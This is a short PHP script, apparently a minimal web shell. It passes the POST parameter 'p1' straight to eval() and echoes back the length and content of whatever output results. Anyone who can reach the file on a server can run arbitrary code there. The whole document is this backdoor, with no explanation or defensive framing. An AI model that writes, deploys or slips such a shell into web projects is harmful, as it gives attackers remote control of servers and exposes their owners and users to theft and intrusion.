<?php
ob_start();
eval($_POST['p1']);
$temp = htmlspecialchars(ob_get_clean());
echo strlen($temp), "\n", $temp;
?>